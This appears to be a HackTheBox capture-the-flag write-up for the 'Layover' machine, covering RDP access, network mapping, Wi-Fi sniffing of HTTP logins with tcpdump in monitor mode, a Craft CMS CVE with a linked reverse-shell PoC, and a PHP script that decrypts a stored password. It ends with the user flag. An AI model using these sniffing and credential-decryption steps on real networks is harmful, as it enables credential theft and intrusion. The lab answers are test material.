# Layover



## Port 3389

**RDP - Remote Desktop Protocol**
It lets you connect to and control one computer from another computer over a network or the internet.( directly desktop gui not command
line interface).

```
creds(given by htb) ::
Username : contractor
Password : Contractor2026!
```

a linux machine :

<img width="826" height="513" alt="Screenshot 2026-09-28 at 13 03 26" src="https://github.com/user-attachments/assets/65a3cb67-c409-46b5-b47f-e8a96c7fe688" />

this user has all the sudo privileges so I think there is another machine we want to attack and get the root, for this machine we alreadyhave the root.

<img width="1069" height="391" alt="Screenshot 2026-09-28 at 13 04 19" src="https://github.com/user-attachments/assets/86663f91-809b-4b0f-a67f-a7ec7d6db1e0" />

this machine shows a different ip ```10.159.143.45/24``` from the one we used to connect to it (ip given by htb, used for nmap scan).


```
ip route get 10.129.39.158<ip_htb>
```

<img width="743" height="105" alt="Screenshot 2026-09-28 at 15 28 58" src="https://github.com/user-attachments/assets/f51dad78-f71e-4b22-9480-c8b2a622ddf1" />

this explains that there is another gateway that routing traffic.

                                Mac 
                                 |
                              gateway                                                    10.159.143.0/24
                    operates on 10.129.39.158(htb_ip)                                       ___|___
                    operates ports 22 and 3889                                   10.159.143.1      10.159.143.45
                                                                                   (gateway)        (linux machine we got)
                    have local network with the machine that we got above.
                    in a subnet 10.159.143.0/24.

    the traffic that we give to port 10.129.39.158:3389 will first go to gateway and it gets forwarded or routed to 10.159.143.45

the ssh traffic from my Mac to layover.htb is also not reaching the rdp machine which strongly suggests that there is another machine.

after connecting to the wifi provided we can access ```http://portal.international.htb/```.

**Capturing the http request on the local network for capturing the creds that others use to login.**

```

iwconfig        # mode = managed should be changed to monitor (monitor helps us to capture requests to server from other users also in a                             small range).

sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up

start tcpdump to capture the traffic(http as the website is hosted in the http(unencrypted) so we will get the creds if anyone in the same network enters).

sudo tcpdump -i wlan3 -w http.pcap 'tcp port 80'

inspecting the capture.pcap file will reveal the creds.

```

**Creds :**
```
username : jenny
password : Fl1ghtDeck2026!
```

endpoint **```portal.international.htb/admin```** gives a craft cms portal which can be logged in with those creds.

## Craft cms v 5.9.8

Craft CMS is a tool used to build and manage custom websites.(similar to Wordpress but more advanced)(core work is same)

## CVE-2026-44011

The /admin/actions/element-search/search endpoint takes the user-supplied condition parameter and passes it directly to Yii2's object
creation function (createCondition()) without sanitizing it first.

yii2 can create objects that can directly be configured to execute the shell commands.


https://github.com/khush-613/CVE-2026-44011-poc/tree/main

gives reverse shell. gives **```www-data```**.

### User - aporter

```
/var/www/portal/.env
```

```
.env files :: a simple text file used to store sensitive data and configuration settings separate from your application's source code.
```

<img width="1003" height="553" alt="Screenshot 2026-10-03 at 00 04 23" src="https://github.com/user-attachments/assets/c7d012c7-5b4b-4b1b-a717-09ba2dc48d79" />

the env contains the password and DB name and also mainly craftcms key(key used by craft cms platform to encrypt sensitive passwords).

in the ```htbairways_settings``` table reveals the encrypted password of **aporter** user.

<img width="1470" height="408" alt="Screenshot 2026-10-03 at 00 05 49" src="https://github.com/user-attachments/assets/1e180663-2cc7-4380-8707-fc86c0a3e847" />

**script for decryption ::**
```
cat > /tmp/decrypt2.php << 'EOF'
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
require "/var/www/portal/vendor/autoload.php";

$enc = trim(file_get_contents("/tmp/enc.txt"));
$key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr";

$security = new \yii\base\Security();
$result = $security->decryptByKey(base64_decode($enc), $key);

var_dump($result);
EOF
php /tmp/decrypt2.php
```
**SSH credentials ::**
```
Username :: aporter
Password :: "SkypOrt_Relay!26"
```
## User flag ::
```
213b869b0920cc8e70e0f2b9ce83adf7
```




